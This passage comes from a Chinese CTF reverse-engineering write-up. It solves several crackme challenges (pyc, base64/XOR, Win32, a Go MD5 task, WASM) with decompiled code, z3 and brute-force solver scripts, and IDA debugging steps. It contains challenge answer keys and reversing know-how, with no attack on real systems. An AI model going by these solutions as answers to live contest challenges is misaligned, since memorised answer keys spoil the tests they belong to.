i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (dir[j] == num1[i]) &#123;</span><br><span class="line">					des[i] = j;				<span class="comment">//记录对应数据的位置</span></span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">127</span>; j++) &#123;	  <span class="comment">//爆破范围一般在 0-127 就可以了，对应的ASCii都是可以显示出来的  </span></span><br><span class="line">				<span class="keyword">if</span> (((j &gt;&gt; <span class="number">4</span>) * <span class="number">16</span> + (j &amp; <span class="string">&#x27;\u000f&#x27;</span>)) == des[i]) &#123;</span><br><span class="line">					cout &lt;&lt; (<span class="keyword">char</span>)j;		<span class="comment">//对数据进行爆破</span></span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行程序便可以得到对应的 flag 。</p>
<h3 id="珍惜生命"><a href="#珍惜生命" class="headerlink" title="珍惜生命"></a><strong>珍惜生命</strong></h3><p>我们拿到手的是一份 pyc 我们对其进行反编译成 py ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.5.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.7 (3394)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.5 (default, Nov 16 2020, 22:23:17) </span></span><br><span class="line"><span class="comment"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]</span></span><br><span class="line"><span class="comment"># Embedded file name: easypy.py</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 1805 bytes</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Challenge</span>():</span></span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to py&#x27;s world&quot;</span>)</span><br><span class="line">    S = <span class="built_in">input</span>(<span class="string">&#x27;plz give me your flag:&#x27;</span>)</span><br><span class="line">    Key = <span class="built_in">input</span>(<span class="string">&#x27;plz give me your key(string):&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(S) != <span class="number">51</span> <span class="keyword">or</span> <span class="built_in">len</span>(Key) != <span class="number">8</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;the flag&#x27;s or key&#x27;s strlen...&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = S[<span class="number">4</span>:<span class="number">50</span>]</span><br><span class="line">        KEY_cmp = <span class="string">&#x27;Syclover&#x27;</span></span><br><span class="line">        key = []</span><br><span class="line">        key_cmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> Key:</span><br><span class="line">            key.append(<span class="built_in">ord</span>(i))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            key_cmp += <span class="built_in">chr</span>((key[<span class="number">1</span>] * key[<span class="number">2</span>] - key[<span class="number">5</span>] * <span class="number">72</span> - key[<span class="number">4</span>] * <span class="number">3</span> - key[<span class="number">3</span>] ^ key[<span class="number">1</span>] + (key[<span class="number">3</span>] &lt;&lt; <span class="number">2</span>) + key[<span class="number">2</span>] * <span class="number">6</span> - key[<span class="number">7</span>] &amp; key[<span class="number">6</span>] - <span class="number">1000</span>) - <span class="number">14</span>)</span><br><span class="line">            key_cmp += <span class="built_in">chr</span>((key[<span class="number">5</span>] * <span class="number">7</span> + key[<span class="number">3</span>] * <span class="number">3</span> + key[<span class="number">2</span>] + key[<span class="number">6</span>] - (key[<span class="number">2</span>] &gt;&gt; <span class="number">2</span>) - key[<span class="number">1</span>] ^ key[<span class="number">0</span>] + key[<span class="number">7</span>] + (key[<span class="number">4</span>] ^ key[<span class="number">1</span>]) + (key[<span class="number">4</span>] | key[<span class="number">7</span>])) - <span class="number">801</span>)</span><br><span class="line">            key_cmp += <span class="built_in">chr</span>((key[<span class="number">6</span>] * <span class="number">5</span> + key[<span class="number">2</span>] * <span class="number">6</span> - key[<span class="number">3</span>] * <span class="number">7</span> + key[<span class="number">4</span>] | key[<span class="number">5</span>] + key[<span class="number">4</span>] * <span class="number">10</span> + key[<span class="number">0</span>] ^ key[<span class="number">1</span>] * <span class="number">3</span> - key[<span class="number">7</span>] + key[<span class="number">0</span>] + key[<span class="number">1</span>]) - <span class="number">924</span>)</span><br><span class="line">            key_cmp += <span class="built_in">chr</span>(key[<span class="number">1</span>] * <span class="number">3</span> + key[<span class="number">5</span>] * <span class="number">9</span> + key[<span class="number">0</span>] + key[<span class="number">2</span>] * <span class="number">2</span> + key[<span class="number">3</span>] * <span class="number">5</span> - key[<span class="number">4</span>] * (key[<span class="number">6</span>] ^ key[<span class="number">7</span>]) + <span class="number">321</span> - <span class="number">16</span>)</span><br><span class="line">            key_cmp += <span class="built_in">chr</span>((key[<span class="number">5</span>] * <span class="number">12</span> - key[<span class="number">0</span>] ^ key[<span class="number">6</span>] - key[<span class="number">3</span>] * <span class="number">23</span> + key[<span class="number">4</span>] * <span class="number">3</span> + key[<span class="number">2</span>] * <span class="number">8</span> + key[<span class="number">1</span>] - key[<span class="number">7</span>] * <span class="number">2</span> + key[<span class="number">6</span>] * <span class="number">4</span> + <span class="number">1324</span>) + <span class="number">1</span>)</span><br><span class="line">            key_cmp += <span class="built_in">chr</span>(key[<span class="number">3</span>] * <span class="number">54</span> - key[<span class="number">1</span>] * <span class="number">3</span> + key[<span class="number">2</span>] * <span class="number">3</span> + key[<span class="number">4</span>] * <span class="number">11</span> - key[<span class="number">5</span>] * <span class="number">2</span> + key[<span class="number">0</span>] + key[<span class="number">7</span>] * <span class="number">3</span> - key[<span class="number">6</span>] - <span class="number">6298</span> + <span class="number">40</span>)</span><br><span class="line">            key_cmp += <span class="built_in">chr</span>(key[<span class="number">7</span>] - key[<span class="number">6</span>] * key[<span class="number">3</span>] + key[<span class="number">2</span>] * key[<span class="number">2</span>] - key[<span class="number">4</span>] * <span class="number">32</span> + key[<span class="number">5</span>] * (key[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>) - key[<span class="number">1</span>] * key[<span class="number">1</span>] - <span class="number">6689</span> + <span class="number">41</span>)</span><br><span class="line">            key_cmp += <span class="built_in">chr</span>((key[<span class="number">5</span>] - key[<span class="number">3</span>] * <span class="number">41</span> + key[<span class="number">6</span>] * <span class="number">41</span> + key[<span class="number">5</span>] ^ (key[<span class="number">4</span>] &amp; key[<span class="number">6</span>] | key[<span class="number">0</span>]) - (key[<span class="number">7</span>] * <span class="number">24</span> | key[<span class="number">2</span>]) + key[<span class="number">1</span>] - <span class="number">589</span>) - <span class="number">36</span>)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You know what I&#x27;m going to say...&quot;</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key_cmp != KEY_cmp:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You know what I&#x27;m going to say...&quot;</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line">        flag = [</span><br><span class="line">         <span class="number">113</span>, <span class="number">74</span>, <span class="number">71</span>, <span class="number">35</span>, <span class="number">29</span>, <span class="number">91</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">114</span>, <span class="number">73</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">69</span>, <span class="number">5</span>, <span class="number">113</span>, <span class="number">35</span>, <span class="number">95</span>, <span class="number">38</span>, <span class="number">20</span>, <span class="number">112</span>, <span class="number">95</span>, <span class="number">7</span>, <span class="number">74</span>, <span class="number">12</span>, <span class="number">102</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">31</span>, <span class="number">87</span>, <span class="number">5</span>, <span class="number">113</span>, <span class="number">98</span>, <span class="number">85</span>, <span class="number">38</span>, <span class="number">16</span>, <span class="number">112</span>, <span class="number">29</span>, <span class="number">6</span>, <span class="number">30</span>, <span class="number">12</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">36</span>, <span class="number">12</span>, <span class="number">23</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">46</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(tmp[i]) ^ key[((i + <span class="number">1</span>) % <span class="built_in">len</span>(key))] != flag[i]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;You know what I&#x27;m going to say...&quot;</span>)</span><br><span class="line">                sys.exit()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Yeah!Submit your flag in a hurry~&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Challenge()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>经过简单的分析我们看到  key（长度为 8 ）是这个题目的解题关键，我们看到 try 函数里都是对 key 的每一位进行运算后的数据进行拼接，最后的数据与 “Syclover” 进行比较，如果相同则继续执行。在最后一个的 <code>for i in range(46):</code>便是对输入的 S 与 key 一起异或得到的 flag 的每一位脚本如下：</p>
<p>解 key 我们采用 z3-solver 来进行求解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key1 = BitVec(<span class="string">&#x27;key1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">key2 = BitVec(<span class="string">&#x27;key2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">key3 = BitVec(<span class="string">&#x27;key3&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">key4 = BitVec(<span class="string">&#x27;key4&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">key5 = BitVec(<span class="string">&#x27;key5&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">key6 = BitVec(<span class="string">&#x27;key6&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">key7 = BitVec(<span class="string">&#x27;key7&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">key8 = BitVec(<span class="string">&#x27;key8&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = Solver()</span><br><span class="line"></span><br><span class="line">key.add((key2 * key3 - key6 * <span class="number">72</span> - key5 * <span class="number">3</span> - key4 ^ key2 + (key4 &lt;&lt; <span class="number">2</span>) + key3 * <span class="number">6</span> - key8 &amp; key7 - <span class="number">1000</span>) - <span class="number">14</span>==<span class="built_in">ord</span>(<span class="string">&#x27;S&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key.add(((key6 * <span class="number">7</span> + key4 * <span class="number">3</span> + key3 + key7 - (key3 &gt;&gt; <span class="number">2</span>) - key2 ^ key1 + key8 + (key5 ^ key2) + (key5 | key8)) - <span class="number">801</span>)==<span class="built_in">ord</span>(<span class="string">&#x27;y&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key.add(((key7 * <span class="number">5</span> + key3 * <span class="number">6</span> - key4 * <span class="number">7</span> + key5 | key6 + key5 * <span class="number">10</span> + key1 ^ key2 * <span class="number">3</span> - key8 + key1 + key2) - <span class="number">924</span>)==<span class="built_in">ord</span>(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key.add((key2 * <span class="number">3</span> + key6 * <span class="number">9</span> + key1 + key3 * <span class="number">2</span> + key4 * <span class="number">5</span> - key5 * (key7 ^ key8) + <span class="number">321</span> - <span class="number">16</span>)==<span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key.add(((key6 * <span class="number">12</span> - key1 ^ key7 - key4 * <span class="number">23</span> + key5 * <span class="number">3</span> + key3 * <span class="number">8</span> + key2 - key8 * <span class="number">2</span> + key7 * <span class="number">4</span> + <span class="number">1324</span>) + <span class="number">1</span>)==<span class="built_in">ord</span>(<span class="string">&#x27;o&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key.add((key4 * <span class="number">54</span> - key2 * <span class="number">3</span> + key3 * <span class="number">3</span> + key5 * <span class="number">11</span> - key6 * <span class="number">2</span> + key1 + key8 * <span class="number">3</span> - key7 - <span class="number">6298</span> + <span class="number">40</span>)==<span class="built_in">ord</span>(<span class="string">&#x27;v&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key.add((key8 - key7 * key4 + key3 * key3 - key5 * <span class="number">32</span> + key6 * (key1 &gt;&gt; <span class="number">2</span>) - key2 * key2 - <span class="number">6689</span> + <span class="number">41</span>)==<span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key.add(((key6 - key4 * <span class="number">41</span> + key7 * <span class="number">41</span> + key6 ^ (key5 &amp; key7 | key1) - (key8 * <span class="number">24</span> | key3) + key2 - <span class="number">589</span>) - <span class="number">36</span>)==<span class="built_in">ord</span>(<span class="string">&#x27;r&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> key.check()==sat:</span><br><span class="line">    <span class="built_in">print</span>(key.model())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;WA&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以得到 key 的值为 ：</p>
<p><img src="https://static01.imgkr.com/temp/820b126431c24af99aa5f01e410f010b.png"></p>
<p>接下来我们对 flag 进行求解 ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">83</span>, <span class="number">38</span>, <span class="number">121</span>, <span class="number">99</span>, <span class="number">64</span>, <span class="number">45</span>, <span class="number">54</span>, <span class="number">46</span>]</span><br><span class="line">flag = [<span class="number">113</span>, <span class="number">74</span>, <span class="number">71</span>, <span class="number">35</span>, <span class="number">29</span>, <span class="number">91</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">114</span>, <span class="number">73</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">69</span>, <span class="number">5</span>, <span class="number">113</span>, <span class="number">35</span>, <span class="number">95</span>, <span class="number">38</span>, <span class="number">20</span>, <span class="number">112</span>, <span class="number">95</span>, <span class="number">7</span>, <span class="number">74</span>, <span class="number">12</span>, <span class="number">102</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">31</span>, <span class="number">87</span>, <span class="number">5</span>, <span class="number">113</span>, <span class="number">98</span>, <span class="number">85</span>, <span class="number">38</span>, <span class="number">16</span>, <span class="number">112</span>, <span class="number">29</span>, <span class="number">6</span>, <span class="number">30</span>, <span class="number">12</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">36</span>, <span class="number">12</span>, <span class="number">23</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span>(j^key[(i+<span class="number">1</span>)%<span class="number">8</span>]==flag[i]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行上述脚本便可以得到 flag</p>
<h3 id="RE-1"><a href="#RE-1" class="headerlink" title="RE 1"></a><strong>RE 1</strong></h3><p>这个题目感觉就十分的简单了，整体上就是一个 Base64 加上了一个异或。</p>
<p><img src="https://static01.imgkr.com/temp/6d7dfb0374ac4188981c0bda9061d3bb.png"></p>
<p>我们利用<code>Lazy IDA </code>提取对应<code>data</code>里的数据 ：</p>
<p><img src="https://static01.imgkr.com/temp/41464d1b8d6b49e7a246ceaabf4e00e2.png"></p>
<p>然后简单的写一个脚本进行解密 ：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> compare[] = &#123;<span class="number">0x15</span>, <span class="number">0x71</span>, <span class="number">0x2C</span>, <span class="number">0x04</span>, <span class="number">0x25</span>, <span class="number">0x71</span>, <span class="number">0x28</span>, <span class="number">0x10</span>, <span class="number">0x15</span>, <span class="number">0x2C</span>, <span class="number">0x79</span>, <span class="number">0x28</span>, <span class="number">0x22</span>, <span class="number">0x2D</span>, <span class="number">0x12</span>, <span class="number">0x26</span>, <span class="number">0x19</span>, <span class="number">0x2D</span>,<span class="number">0x06</span>, <span class="number">0x3A</span>, <span class="number">0x1A</span>, <span class="number">0x14</span>, <span class="number">0x19</span>, <span class="number">0x70</span>, <span class="number">0x18</span>, <span class="number">0x72</span>, <span class="number">0x06</span>, <span class="number">0x39</span>, <span class="number">0x1A</span>, <span class="number">0x16</span>, <span class="number">0x79</span>, <span class="number">0x70</span>, <span class="number">0x21</span>, <span class="number">0x07</span>, <span class="number">0x16</span>, <span class="number">0x26</span>,<span class="number">0x19</span>, <span class="number">0x2D</span>, <span class="number">0x06</span>, <span class="number">0x3A</span>, <span class="number">0x21</span>, <span class="number">0x18</span>, <span class="number">0x0E</span>, <span class="number">0x26</span>, <span class="number">0x22</span>, <span class="number">0x72</span>, <span class="number">0x1A</span>, <span class="number">0x26</span>, <span class="number">0x23</span>, <span class="number">0x2D</span>, <span class="number">0x16</span>, <span class="number">0x72</span>, <span class="number">0x1A</span>, <span class="number">0x18</span>,<span class="number">0x0A</span>, <span class="number">0x3A</span>, <span class="number">0x1A</span>, <span class="number">0x18</span>, <span class="number">0x70</span>, <span class="number">0x7D</span></span><br><span class="line">	                &#125;;</span><br><span class="line">	<span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">60</span>; i++) &#123;</span><br><span class="line">		num=compare[i]^<span class="number">0x40</span>;</span><br><span class="line">		cout&lt;&lt;hex&lt;&lt;num&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后我们将得到的字符串用 <code>Python</code>带的<code>Base64</code>库直接<code>decode</code>就可以得到 Flag 。</p>
<h3 id="Win-32"><a href="#Win-32" class="headerlink" title="Win 32"></a><strong>Win 32</strong></h3><p>和RE 1 一样直接是一个<code>Base 64</code>的题目，这个题目被修改过，我们可以直接在<code>Strings</code>里提取到<code>Base 64</code>加密后的数据 ：</p>
<p><img src="https://static01.imgkr.com/temp/c9faf3d05a56447c954c80e4a73b37f3.png"></p>
<p>标准 <code>Base64</code> 加密过程 ：</p>
<p><img src="https://static01.imgkr.com/temp/6530ec5bfcfc452591d69b6523b2d16c.png"></p>
<p>于是我们直接拿着那串数据进行<code>Base 64</code>解码就可以得到 Flag。</p>
<p><img src="https://static01.imgkr.com/temp/c200d6f81ca145f1b51f7c3c9ff67b4a.png"></p>
<h3 id="Brute-force"><a href="#Brute-force" class="headerlink" title="Brute_force"></a><strong>Brute_force</strong></h3><p>这个题目又是一个新语言（ GO 语言 ）的逆向题目，我们还是将程序拖入<code>IDA</code>中进行分析，其中有一个非常显眼的 <code>main_main</code>，可以看到如下界面 ：</p>
<p><img src="https://static01.imgkr.com/temp/d6fb1f2a40bb44f1aa5fb8fad4fb5b5c.png"></p>
<p>乍一看不知道程序在干些什么，但是我们细看可以发现在函数里面有着<code>MD5</code>的提示，与此同时在<code>main_main</code>上面的 if 语句里面好像有一个 24 ，此时我们猜测这个 24 便是我们输入<code>Flag</code>的长度。但是如果这个时候你开始动调是不是会发现有一个问题，在你启动<code>IDA</code>动态调试后的一瞬间，程序闪了一下就结束了，即使你打了断点也还是闪了一下就结束了，你也可以试试看拿<code>cmd</code>打开，你会发现有一行提示：</p>
<p><img src="https://static01.imgkr.com/temp/867d984259a14f0385c5981bf2a472ee.png"></p>
<p>这个时候我们需要打开<code>IDA</code>里面的<code>Debugger</code></p>
<p><img src="https://static01.imgkr.com/temp/446f158987a2431da0feebf36fcf2b39.png"></p>
<p>在里面找到对应的 <code>Process options</code>，并打开下面的<code>Use source-level debugging</code>（点一下就可以了，点完后没有什么反应的）：</p>
<p><img src="https://static01.imgkr.com/temp/f33f3525e7af4590bc1e26c90ab8f418.png"></p>
<p>我们在 <code>Process options</code>里对应位置填入我们的 24 位测试数据：</p>
<p><img src="https://static01.imgkr.com/temp/617bfed769834d56ae558cd78cfe192e.png"></p>
<p>之后我们在函数<code>main_encode</code>和<code>main_unnamed630</code>里打上断点开始调试，观察里面的数据变化过程，你会发现在栈里多出来一个数据 ：</p>
<p><img src="https://static01.imgkr.com/temp/e949377cc91a42caab9680617da50a91.png"></p>
<p>仔细观察会发现这一串数据在某个位置可以分成两个部分，这两个部分是一样的，我们提出其中一半进行<code>MD5</code>解密你会发现这个加密后的数据是我们输入的<code>ABCD</code>我们大概就可以猜测出这个程序是将我们的输入数据进行拆分，每 4 个一组，一共 24 个数据，那么刚刚好 6 组，也验证了我们猜测 <code>Flag</code>的长度是 24 ，我们继续调试，之后可以发现在内存里是把我们<code>Flag</code>已经提前写入了 ：</p>
<p><img src="https://static01.imgkr.com/temp/9ff9ea0971a345ab83e69aa8897df686.png"></p>
<p>我们需要的就是动态调试得到对应<code>MD5</code>的顺序，然后再对其分别解密，脚本如下 ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/_&quot;</span></span><br><span class="line">list1 = [<span class="string">&#x27;&#x27;</span>]<span class="comment">#输入加密的MD5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>, <span class="number">128</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>, <span class="number">128</span>):</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>, <span class="number">128</span>):</span><br><span class="line">                    <span class="built_in">str</span> = <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(d)</span><br><span class="line">                    flag = hashlib.md5(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> flag == j.casefold():</span><br><span class="line">                        <span class="built_in">print</span>(<span class="built_in">str</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>可以分别解出来对应的数据为<code>3_sl r0g@ 7h3_ rm_1 g0_p gned</code></p>
<p>再根据动调出的<code>MD5</code>进行排序，可以得到输入为<code>7h3_g0_pr0g@rm_13_slgned</code>,但是这个就是<code>Flag</code>吗显然不是，我们再观察<code>main_main</code>，切换到汇编层的结构图 ：</p>
<p><img src="https://static01.imgkr.com/temp/0b37d29a510b4fb098f9fff462a0b45d.png"></p>
<p>这个时候我们加上对应格式便是我们所要的<code>Flag</code></p>
<h3 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a><strong>WASM</strong></h3><p>整个题目就是找不到工具硬开生坚果<del>（WABT就是下载不了）</del>，在网上找了半天终于发现有一个易语言写的提取 .o 文件的工具了（太难了）。</p>
<p>题目整体上就是一个异或（题目提示）我们只需要找到对应位置的是数据进行异或处理就可以了。</p>
<p><img src="https://static01.imgkr.com/temp/475f6f1ad9e942898bf43ec76ab71619.png"></p>
<p><img src="https://static01.imgkr.com/temp/b2227c5b3d1647ce97c9196ff60f54e3.png"></p>
<p>解题脚本如下 ：（爆破YYDS）</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> xors;</span><br><span class="line">	<span class="keyword">char</span> ans[]= &#123;<span class="number">0x35</span>,<span class="number">0x3F</span>,<span class="number">0x25</span>,<span class="number">0x1D</span>,<span class="number">0x11</span>,<span class="number">0x07</span>,<span class="number">0x15</span>,<span class="number">0x0B</span>,<span class="number">0x39</span>,<span class="number">0x2f</span>,<span class="number">0x15</span>,<span class="number">0x39</span>,<span class="number">0x35</span>,<span class="number">0x56</span>,<span class="number">0x39</span>,<span class="number">0x21</span>,<span class="number">0x21</span>,<span class="number">0x09</span>,<span class="number">0x56</span>,<span class="number">0x02</span>,<span class="number">0x47</span>,<span 